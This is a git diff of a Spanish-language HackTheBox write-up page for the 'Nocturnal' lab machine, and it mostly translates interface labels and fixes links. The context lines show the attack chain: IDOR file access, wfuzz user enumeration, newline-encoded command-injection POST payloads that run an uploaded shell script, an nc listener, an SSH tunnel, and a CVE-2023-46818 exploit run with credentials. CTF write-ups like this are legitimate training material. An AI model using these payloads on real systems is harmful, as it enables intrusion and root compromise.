@@ -141,7 +141,7 @@
     .val-purple { color: var(--purple); }
     .val-facil  { color: #00ffcc; }
 
-    /* ATTACK PATH */
+    /* RUTA DE ATAQUE */
     .attack-path { display: flex; flex-direction: column; gap: 0; }
     .ap-item { display: flex; align-items: flex-start; gap: 0.8rem; padding: 0.5rem 0; }
     .ap-dot { width: 8px; height: 8px; background: var(--green); border-radius: 50%; margin-top: 4px; flex-shrink: 0; box-shadow: 0 0 6px var(--green); }
@@ -309,15 +309,16 @@
   </style>
 </head>
 <body>
-<a href="#main" class="skip-link">Skip to content</a>
+<a href="#main" class="skip-link">Saltar al contenido</a>
 <div class="cursor" id="cursor"></div>
 <div class="cursor-ring" id="cursorRing"></div>
 <div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
 
 <nav>
-  <a href="../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
-  <a href="https://brandeiks.github.io/writeups/" class="nav-back">volver al portafolio</a>
-</nav>
+    <a href="../../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+    <a href="../../../writeups/index.html" class="nav-back">ANÁLISIS</a>
+    <a href="../../../diccionario/index.html" class="nav-back">DICCIONARIO</a>
+  </nav>
 
 <!-- HERO -->
 <section class="writeup-hero">
@@ -325,22 +326,22 @@
   <div class="hero-glow"></div>
   <div class="writeup-hero-content">
     <div class="breadcrumb">
-      <a href="https://brandeiks.github.io/">brandeiks</a> /
-      <a href="https://brandeiks.github.io/writeups/">writeups</a> /
-      <a href="https://brandeiks.github.io/writeups/">hackthebox</a> /
+      <a href="../../../index.html">brandeiks</a> /
+      <a href="../../../writeups/index.html">análisis</a> /
+      <a href="../../../writeups/index.html">hackthebox</a> /
       <span>nocturnal</span>
     </div>
     <h1 class="writeup-title">NOCT<span>URNAL</span></h1>
-    <p class="writeup-subtitle">// HackTheBox · Linux · Fácil · IDOR + Command Injection + CVE-2023-46818</p>
+    <p class="writeup-subtitle">// HackTheBox · Linux · Fácil · IDOR + Inyección de comandos + CVE-2023-46818</p>
     <div class="writeup-meta">
+      <span class="meta-badge badge-facil">● FÁCIL</span>
       <span class="meta-badge badge-htb">HACKTHEBOX</span>
       <span class="meta-badge badge-linux">LINUX</span>
-      <span class="meta-badge badge-facil">FÁCIL</span>
       <span class="meta-badge badge-idor">IDOR</span>
       <span class="meta-badge badge-cmdinj">CMD INJECTION</span>
       <span class="meta-badge badge-ssh">SSH TUNNEL</span>
       <span class="meta-badge badge-cve">CVE-2023-46818</span>
-      <span class="meta-date">// 2026-05-19</span>
+      <span class="meta-date">📅 Mayo 2026 · Por Brandeiks</span>
     </div>
   </div>
 </section>
@@ -357,8 +358,8 @@
         <li><a href="#idor">04 · IDOR · Enumeración</a></li>
         <li><a href="#creds">05 · Credenciales Amanda</a></li>
         <li><a href="#admin">06 · Panel de Admin</a></li>
-        <li><a href="#cmdinj">07 · Command Injection</a></li>
-        <li><a href="#shell">08 · Reverse Shell</a></li>
+        <li><a href="#cmdinj">07 · Inyección de comandos</a></li>
+        <li><a href="#shell">08 · Reverse shell</a></li>
         <li><a href="#db">09 · SQLite · Hashes</a></li>
         <li><a href="#ssh">10 · SSH como Tobias</a></li>
         <li><a href="#tunnel">11 · SSH Tunneling</a></li>
@@ -380,7 +381,7 @@
     </div>
 
     <div class="sidebar-box">
-      <p class="sidebar-title">// ATTACK PATH</p>
+      <p class="sidebar-title">// RUTA DE ATAQUE</p>
       <div class="attack-path">
         <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">nmap → <span>22, 80</span></div></div>
         <div class="ap-line"></div>
@@ -392,7 +393,7 @@
         <div class="ap-line"></div>
         <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">wfuzz → <span>admin, amanda, tobias</span></div></div>
         <div class="ap-line"></div>
-        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">privacy.odt → creds <span>amanda</span></div></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">privacy.odt → credenciales <span>amanda</span></div></div>
         <div class="ap-line"></div>
         <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Cmd Injection</span> backup</div></div>
         <div class="ap-line"></div>
@@ -437,7 +438,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="ping 10.129.6.36 -c 3">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">PING</span>
         <div><span class="prompt">$ </span><span class="cmd">ping <span class="arg">10.129.6.36</span> <span class="flag">-c</span> <span class="arg">3</span></span></div>
       </div>
@@ -507,7 +508,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open 10.129.6.36 -oX nocturnal.xml">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">ESCANEO</span>
         <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-p-</span> <span class="flag">-sSCV</span> <span class="flag">-n</span> <span class="flag">-Pn</span> <span class="flag">--min-rate=5000</span> <span class="flag">--open</span> <span class="arg">10.129.6.36</span> <span class="flag">-oX</span> <span class="arg">nocturnal.xml</span></span></div>
       </div>
@@ -554,7 +555,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="xsltproc /usr/share/nmap/nmap.xsl nocturnal.xml > nocturnal.html">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">XSLT</span>
         <div><span class="prompt">$ </span><span class="cmd">xsltproc <span class="arg">/usr/share/nmap/nmap.xsl</span> <span class="arg">nocturnal.xml</span> &gt; <span class="arg">nocturnal.html</span></span></div>
       </div>
@@ -591,7 +592,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo nano /etc/hosts">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">HOSTS</span>
         <div><span class="prompt">$ </span><span class="cmd">sudo nano <span class="arg">/etc/hosts</span></span></div>
       </div>
@@ -717,7 +718,7 @@
       </div>
 
       <div class="cmd-block" data-cmd='wfuzz -c -w /usr/share/wordlists/seclists/Usernames/Names/names.txt --hc=404,302 -b "PHPSESSID=6cjdvlm1gveogr1fogib0m1d6v" --hh=2985 "http://nocturnal.htb/view.php?username=FUZZ&file=prueba_nocturnal.odt"'>
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">WFUZZ</span>
         <div><span class="prompt">$ </span><span class="cmd">wfuzz <span class="flag">-c</span> <span class="flag">-w</span> <span class="arg">/usr/share/wordlists/seclists/Usernames/Names/names.txt</span> <span class="flag">--hc=404,302</span> <span class="flag">-b</span> <span class="arg">"PHPSESSID=6cjdvlm1gveogr1fogib0m1d6v"</span> <span class="flag">--hh=2985</span> <span class="arg">"http://nocturnal.htb/view.php?username=FUZZ&amp;file=prueba_nocturnal.odt"</span></span></div>
       </div>
@@ -774,7 +775,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="http://nocturnal.htb/view.php?username=amanda&file=privacy.odt">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">IDOR URL</span>
         <div><span class="prompt">URL: </span><span class="cmd">http://nocturnal.htb/view.php?<span class="flag">username=</span><span class="arg">amanda</span>&amp;<span class="flag">file=</span><span class="arg">privacy.odt</span></span></div>
       </div>
@@ -852,7 +853,7 @@
     <!-- ===================== 07 CMDINJ ===================== -->
     <div class="section" id="cmdinj">
       <p class="section-label">// 07</p>
-      <h2 class="section-title">Command Injection · Función Backup</h2>
+      <h2 class="section-title">Inyección de comandos · Función Backup</h2>
       <div class="section-line"></div>
 
       <div class="step-marker">
@@ -904,13 +905,13 @@
       </div>
 
       <div class="cmd-block" data-cmd="password=%0als&backup=">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">CMD INJECTION</span>
         <div><span class="prompt">[Burp Repeater] POST body: </span><span class="cmd">password=<span class="flag">%0a</span><span class="arg">ls</span>&amp;backup=</span></div>
       </div>
 
       <div class="cmd-block" data-cmd="password=%0als%09-l%09uploads&backup=">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">LISTAR UPLOADS</span>
         <div><span class="prompt">[Burp Repeater] POST body: </span><span class="cmd">password=<span class="flag">%0a</span><span class="arg">ls</span><span class="flag">%09</span><span class="arg">-l</span><span class="flag">%09</span><span class="arg">uploads</span>&amp;backup=</span></div>
       </div>
@@ -933,7 +934,7 @@
     <!-- ===================== 08 SHELL ===================== -->
     <div class="section" id="shell">
       <p class="section-label">// 08</p>
-      <h2 class="section-title">Reverse Shell · Acceso Inicial</h2>
+      <h2 class="section-title">Reverse shell · Acceso Inicial</h2>
       <div class="section-line"></div>
 
       <div class="step-marker">
@@ -965,7 +966,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="nano shell.pdf">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">CREAR SHELL</span>
         <div><span class="prompt">$ </span><span class="cmd">nano <span class="arg">shell.pdf</span></span></div>
         <div><span class="comment">#!/bin/bash</span></div>
@@ -993,13 +994,13 @@
       </div>
 
       <div class="cmd-block" data-cmd="nc -lvnp 443">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">LISTENER</span>
         <div><span class="prompt">$ </span><span class="cmd">nc <span class="flag">-lvnp</span> <span class="arg">443</span></span></div>
       </div>
 
       <div class="cmd-block" data-cmd="password=%0abash%09uploads/shell.pdf&backup=">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">TRIGGER SHELL</span>
         <div><span class="prompt">[Burp Repeater] POST body: </span><span class="cmd">password=<span class="flag">%0a</span><span class="arg">bash</span><span class="flag">%09</span><span class="arg">uploads/shell.pdf</span>&amp;backup=</span></div>
       </div>
@@ -1043,7 +1044,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sqlite3 ../nocturnal_database/nocturnal_database.db">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SQLITE</span>
         <div><span class="prompt">www-data$ </span><span class="cmd">sqlite3 <span class="arg">../nocturnal_database/nocturnal_database.db</span></span></div>
         <div><span class="prompt">sqlite3&gt; </span><span class="cmd">.tables</span></div>
@@ -1109,7 +1110,7 @@
 
       <div class="step-marker">
         <div class="step-num">16</div>
-        <span class="step-title">SSH COMO TOBIAS — USER FLAG</span>
+        <span class="step-title">SSH COMO TOBIAS — BANDERA DE USUARIO</span>
       </div>
       <div class="prose">
         <p>
@@ -1121,7 +1122,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="ssh tobias@10.129.6.36">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SSH</span>
         <div><span class="prompt">$ </span><span class="cmd">ssh <span class="arg">tobias@10.129.6.36</span></span></div>
       </div>
@@ -1153,7 +1154,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="netstat -tlnp | grep LISTEN">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">NETSTAT</span>
         <div><span class="prompt">tobias@nocturnal:~$ </span><span class="cmd">netstat <span class="flag">-tlnp</span> | grep <span class="arg">LISTEN</span></span></div>
       </div>
@@ -1200,7 +1201,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="ssh -L 9000:127.0.0.1:8080 tobias@nocturnal.htb">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SSH TUNNEL</span>
         <div><span class="prompt">$ </span><span class="cmd">ssh <span class="flag">-L</span> <span class="arg">9000:127.0.0.1:8080</span> <span class="arg">tobias@nocturnal.htb</span></span></div>
       </div>
@@ -1266,7 +1267,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="git clone https://github.com/ajdumanhug/CVE-2023-46818.git">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">CLONE</span>
         <div><span class="prompt">$ </span><span class="cmd">git clone <span class="arg">https://github.com/ajdumanhug/CVE-2023-46818.git</span></span></div>
       </div>
@@ -1277,7 +1278,7 @@
     <!-- ===================== 13 ROOT ===================== -->
     <div class="section" id="root">
       <p class="section-label">// 13</p>
-      <h2 class="section-title">Root Flag · Pwned</h2>
+      <h2 class="section-title">Bandera de root · Pwned</h2>
       <div class="section-line"></div>
 
       <div class="step-marker">
@@ -1301,7 +1302,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="python3 CVE-2023-46818.py http://127.0.0.1:9000 admin slowmotionapocalypse">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">EXPLOIT</span>
         <div><span class="prompt">$ </span><span class="cmd">python3 <span class="arg">CVE-2023-46818.py</span> <span class="arg">http://127.0.0.1:9000</span> <span class="arg">admin</span> <span class="arg">slowmotionapocalypse</span></span></div>
       </div>
@@ -1326,11 +1327,11 @@
 
       <div class="cred-box">
         <div class="cred-item">
-          <div class="cred-label">USER FLAG</div>
+          <div class="cred-label">BANDERA DE USUARIO</div>
           <div class="cred-val">0508ebedaf704526abea7844cbfe9aaa</div>
         </div>
         <div class="cred-item">
-          <div class="cred-label">ROOT FLAG</div>
+          <div class="cred-label">BANDERA DE ROOT</div>
           <div class="cred-val">e5c617ebf85b6e0cd2bfbe3feb010ab1</div>
         </div>
       </div>
@@ -1340,8 +1341,8 @@
         <p>
           <strong>1. IDOR</strong> → acceso no autorizado a archivos de otros usuarios via view.php<br>
           <strong>2. Credential Exposure</strong> → contraseña de amanda en archivo ODT<br>
-          <strong>3. Command Injection</strong> → ejecución de comandos en el backup del admin<br>
-          <strong>4. Reverse Shell</strong> → bypass de filtro de extensiones con shell.pdf<br>
+          <strong>3. Inyección de comandos</strong> → ejecución de comandos en el backup del admin<br>
+          <strong>4. Reverse shell</strong> → bypass de filtro de extensiones con shell.pdf<br>
           <strong>5. SQLite Hash Dump</strong> → credenciales de tobias crackeadas con CrackStation<br>
           <strong>6. SSH Tunneling</strong> → pivoteo al ISPConfig interno en puerto 8080<br>
           <strong>7. CVE-2023-46818</strong> → PHP Code Injection → root
@@ -1457,9 +1458,9 @@
         </div>
 
         <div class="glos-card">
-          <div class="glos-term">Command Injection — Inyección de Comandos OS</div>
+          <div class="glos-term">Inyección de comandos — Inyección de Comandos OS</div>
           <div class="glos-def">
-            <strong>Command Injection</strong> ocurre cuando datos proporcionados por el usuario se
+            <strong>Inyección de comandos</strong> ocurre cuando datos proporcionados por el usuario se
             pasan sin sanitizar a una función que ejecuta comandos del sistema operativo. En Nocturnal,
             el campo <code>password</code> del backup se concatenaba directamente a un comando shell.
             Al insertar <code>%0a</code> (newline), el shell interpretaba el input como dos comandos
@@ -1470,7 +1471,7 @@
         </div>
 
         <div class="glos-card">
-          <div class="glos-term">Reverse Shell — Shell Inversa</div>
+          <div class="glos-term">Reverse shell — Shell Inversa</div>
           <div class="glos-def">
             Una <strong>reverse shell</strong> es una técnica donde el servidor comprometido
             <em>inicia</em> la conexión hacia la máquina del atacante, en lugar de al revés.
@@ -1520,7 +1521,7 @@
         </div>
 
         <div class="glos-card">
-          <div class="glos-term">MD5 Hash Cracking — Rainbow Tables</div>
+          <div class="glos-term">MD5 Cracking de hashes — Rainbow Tables</div>
           <div class="glos-def">
             <strong>MD5</strong> es un algoritmo de hash criptográfico de 128 bits (32 caracteres
             hex) diseñado en 1991. Está considerado roto para uso en contraseñas: es rápido de
@@ -1553,9 +1554,9 @@
 
 <!-- FOOTER -->
 <footer>
-  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · HackTheBox</p>
-  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
-</footer>
+    <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Análisis de nocturnal · HackTheBox</p>
+    <p>Hecho con <span>kali linux</span> &amp; <span>❤</span></p>
+  </footer>
 
 <script>
   // ACTIVE TOC
